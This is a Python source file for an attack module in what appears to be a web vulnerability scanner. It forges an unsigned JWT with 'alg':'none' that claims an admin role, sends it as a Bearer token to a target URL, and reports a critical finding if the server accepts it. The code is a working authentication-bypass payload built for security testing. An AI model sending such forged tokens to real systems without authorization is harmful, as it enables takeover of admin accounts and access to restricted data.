import base64
import json
from awap.engines.attack.base import AttackModule

class JWTNoneAlgorithmModule(AttackModule):
    
    def create_none_jwt(self) -> str:
        # No space after ':' for exact encoding match commonly used
        header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
        payload = base64.urlsafe_b64encode(json.dumps({"role":"admin"}).encode()).decode().rstrip("=")
        return f"{header}.{payload}."
        
    async def run(self, url: str, params: list[dict]) -> list[dict]:
        findings = []
        token = self.create_none_jwt()
        header = {"Authorization": f"Bearer {token}"}
        
        try:
            resp = await self.client.get(url, headers=header)
            # A simplistic heuristic: If it succeeds and mentions 'admin' or has restricted data
            body = resp.text.lower()
            if resp.status_code == 200 and ("admin" in body or "dashboard" in body):
                findings.append({
                    'vuln_class': 'JWT_NONE_ALGORITHM',
                    'url': url, 'param': 'Authorization Header',
                    'payload': token,
                    'evidence': "Server accepted JWT token dynamically forged with 'alg': 'none'",
                    'severity': 'CRITICAL', 'cvss': 9.8,
                    'request_raw': str(resp.request.headers),
                    'response_raw': body[:500]
                })
        except Exception:
            pass
            
        return findings
